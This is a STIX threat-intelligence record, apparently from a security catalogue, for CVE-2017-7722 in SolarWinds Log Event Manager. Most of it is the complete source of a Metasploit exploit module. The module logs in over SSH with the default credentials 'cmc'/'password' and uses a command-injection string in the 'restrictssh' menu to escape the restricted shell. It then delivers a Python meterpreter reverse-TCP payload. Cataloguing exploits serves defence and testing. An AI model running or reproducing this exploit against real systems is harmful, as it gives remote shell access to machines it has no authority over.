{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2a4a672f-9ce2-44b1-a521-c5e058b6d5f2",
    "created": "2024-08-14T16:58:17.33814Z",
    "modified": "2024-08-14T16:58:17.338145Z",
    "name": "SolarWinds LEM Default SSH Password Remote Code Execution",
    "description": " This module exploits the default credentials of SolarWinds LEM. A menu system is encountered when the SSH service is accessed with the default username and password which is \"cmc\" and \"password\". By exploiting a vulnerability that exist on the menuing script, an attacker can escape from restricted shell.  This module was tested against SolarWinds LEM v6.3.1.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/solarwinds_lem_exec.rb",
            "external_id": "solarwinds_lem_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7722"
        },
        {
            "source_name": "reference",
            "url": "http://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SolarWinds LEM Default SSH Password Remote Code Execution',\n        'Description' => %q{\n          This module exploits the default credentials of SolarWinds LEM. A menu system is encountered when the SSH\n          service is accessed with the default username and password which is \"cmc\" and \"password\". By exploiting a\n          vulnerability that exist on the menuing script, an attacker can escape from restricted shell.\n\n          This module was tested against SolarWinds LEM v6.3.1.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Mehmet Ince <mehmet@mehmetince.net>',  # discovery & msf module\n        ],\n        'References' => [\n          ['CVE', '2017-7722'],\n          ['URL', 'http://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/']\n        ],\n        'DefaultOptions' => {\n          'Payload' => 'python/meterpreter/reverse_tcp'\n        },\n        'Platform' => ['python'],\n        'Arch' => ARCH_PYTHON,\n        'Targets' => [ ['Automatic', {}] ],\n        'Privileged' => false,\n        'DisclosureDate' => '2017-03-17',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(32022),\n        OptString.new('USERNAME', [ true, 'The username for authentication', 'cmc' ]),\n        OptString.new('PASSWORD', [ true, 'The password for authentication', 'password' ]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def exploit\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['keyboard-interactive'],\n      port: rport,\n      password: password\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    print_status(\"#{rhost}:#{rport} - Attempting to login...\")\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, username, opts)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication due wrong credentials.\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    return unless ssh\n\n    print_good('SSH connection is established.')\n\n    payload_executed = false\n\n    ssh.open_channel do |channel|\n      print_status('Requesting pty... We need it in order to interact with menuing system.')\n\n      channel.request_pty do |ch, pty_success|\n        raise 'Could not request pty!' unless pty_success\n\n        print_good('Pty successfully obtained.')\n\n        print_status('Requesting a shell.')\n        ch.send_channel_request('shell') do |_ch, shell_success|\n          raise 'Could not open shell!' unless shell_success\n\n          print_good('Remote shell successfully obtained.')\n        end\n      end\n\n      channel.on_data do |_ch, data|\n        if data.include? 'cmc '\n          print_good('Step 1 is done. Managed to access terminal menu.')\n          channel.send_data(\"service\\n\")\n        end\n\n        if data.include? 'service '\n          print_good(\"Step 2 is done. Managed to select 'service' sub menu.\")\n          channel.send_data(\"restrictssh\\n\")\n        end\n\n        if data.include? 'Press <enter> to configure restriction on the SSH service to the Manager Appliance'\n          print_good(\"Step 3 is done. Managed to start 'restrictssh' function.\")\n          channel.send_data(\"*#`bash>&2`\\n\")\n        end\n\n        if data.include? 'Are the hosts'\n          print_good('Step 4 is done. We are going to try escape from jail shell.')\n          channel.send_data(\"Y\\n\")\n        end\n\n        if data.include?('/usr/local/contego') && (payload_executed == false)\n          print_good('Sweet..! Escaped from jail.')\n          print_status('Delivering payload...')\n          channel.send_data(\"python -c \\\"#{payload.encoded}\\\"\\n\")\n          payload_executed = true\n        end\n      end\n    end\n    begin\n      ssh.loop unless session_created?\n    rescue Errno::EBADF => e\n      elog(e)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-17",
    "x_mitre_platforms": [
        "['python']"
    ]
}